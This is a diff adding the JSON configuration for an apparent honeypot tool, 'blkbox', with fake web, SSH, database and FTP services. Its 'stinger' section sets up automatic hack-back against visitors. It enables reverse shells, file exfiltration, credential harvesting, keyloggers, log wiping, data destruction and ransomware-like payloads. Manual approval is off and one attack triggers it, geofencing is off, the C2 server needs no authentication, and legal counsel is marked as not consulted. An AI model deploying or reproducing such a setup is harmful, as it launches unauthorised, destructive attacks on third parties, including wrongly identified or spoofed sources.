@@ -1,0 +1,191 @@
+{
+  "honeypots": [
+    {
+      "type": "http",
+      "port": 8080,
+      "enabled": true,
+      "options": {
+        "fakeApps": ["wordpress", "phpmyadmin", "joomla"],
+        "serverHeader": "Apache/2.4.41 (Ubuntu)"
+      }
+    },
+    {
+      "type": "ssh",
+      "port": 2222,
+      "enabled": true,
+      "options": {
+        "banner": "SSH-2.0-OpenSSH_9.0",
+        "allowedUsers": ["root", "admin", "user", "pi", "ubuntu"]
+      }
+    },
+    {
+      "type": "postgresql",
+      "port": 5432,
+      "enabled": true,
+      "options": {
+        "databaseName": "postgres",
+        "allowedDatabases": ["postgres", "template1", "production"]
+      }
+    },
+    {
+      "type": "mysql",
+      "port": 3306,
+      "enabled": true,
+      "options": {
+        "databaseName": "mysql",
+        "allowedDatabases": ["mysql", "information_schema", "performance_schema"]
+      }
+    },
+    {
+      "type": "ftp",
+      "port": 21,
+      "enabled": true,
+      "options": {
+        "ftpBanner": "220 FTP Server Ready",
+        "virtualRoot": "/var/ftp"
+      }
+    }
+  ],
+
+  "cloudflare": {
+    "enabled": true,
+    "apiKey": "",
+    "zoneId": "",
+    "updateFirewall": true,
+    "threatThreshold": 8.0,
+    "autoBlock": true,
+    "blockDuration": 3600
+  },
+
+  "storage": {
+    "database": "./blkbox.db",
+    "retentionDays": 365,
+    "backupInterval": 86400,
+    "geoipDatabase": "./GeoLite2-City.mmdb",
+    "maxDatabaseSize": 10000,
+    "autoVacuum": true
+  },
+
+  "stinger": {
+    "enabled": true,
+    "autoTrigger": true,
+    "dryRun": false,
+
+    "legal": {
+      "counselConsulted": false,
+      "jurisdiction": "US",
+      "warningBannerEnabled": true,
+      "auditLoggingEnabled": true,
+      "retentionPolicyDocumented": true,
+      "incidentResponsePlanExists": false
+    },
+
+    "safeguards": {
+      "requireManualApproval": false,
+      "threatThreshold": 1.0,
+      "minAttackCount": 1,
+      "maxActivePayloads": 1000,
+      "payloadExpirationHours": 168,
+      "maxCallbacksPerPayload": 10000,
+      "cooldownPeriodMinutes": 0,
+      "maxDeploymentsPerIp": 100
+    },
+
+    "whitelist": {
+      "enabled": true,
+      "ips": [
+        "127.0.0.1",
+        "::1"
+      ],
+      "cidrs": [
+        "127.0.0.0/8"
+      ],
+      "description": "Whitelist localhost to prevent self-targeting"
+    },
+
+    "geofencing": {
+      "enabled": false,
+      "mode": "prohibit",
+      "allowedCountries": [],
+      "prohibitedCountries": [],
+      "description": "Geofencing disabled - all countries can be targeted"
+    },
+
+    "payloadRestrictions": {
+      "allowedTypes": [
+        "system_info",
+        "browser_recon",
+        "beacon",
+        "reverse_tcp",
+        "reverse_http",
+        "command_injection",
+        "file_exfiltration",
+        "credential_harvester",
+        "log_wiper",
+        "ransomware_simulator",
+        "data_destruction",
+        "network_scanner",
+        "keylogger",
+        "screenshot_capture"
+      ],
+      "prohibitedTypes": [],
+      "maxPayloadSizeKb": 50000,
+      "obfuscationRequired": false,
+      "allowNetworkScanning": true,
+      "allowFileAccess": true
+    },
+
+    "c2": {
+      "hostname": "localhost",
+      "port": 8443,
+      "useTls": true,
+      "tlsCert": "",
+      "tlsKey": "",
+      "maxConcurrentConnections": 100,
+      "connectionTimeout": 30,
+      "requireAuthentication": false
+    },
+
+    "notifications": {
+      "enabled": true,
+      "email": "",
+      "webhook": "",
+      "notifyOnDeploy": true,
+      "notifyOnCallback": true,
+      "notifyOnError": true
+    }
+  },
+
+  "tracking": {
+    "geoip": true,
+    "fingerprinting": true,
+    "sessionCorrelation": true,
+    "sessionTimeout": 3600,
+    "trackUserAgents": true,
+    "trackHeaders": true,
+    "trackCookies": true,
+    "ipEnrichment": true
+  },
+
+  "logging": {
+    "level": "info",
+    "file": "./blkbox.log",
+    "console": true,
+    "maxFileSize": 100,
+    "maxFiles": 10,
+    "includeTimestamp": true,
+    "includeLevel": true,
+    "colorize": true
+  },
+
+  "server": {
+    "managementPort": 9000,
+    "enableDashboard": true,
+    "corsEnabled": true,
+    "allowedOrigins": ["http://localhost:9000"],
+    "apiRateLimit": 100,
+    "enableSSL": true,
+    "sslCert": "",
+    "sslKey": ""
+  }
+}
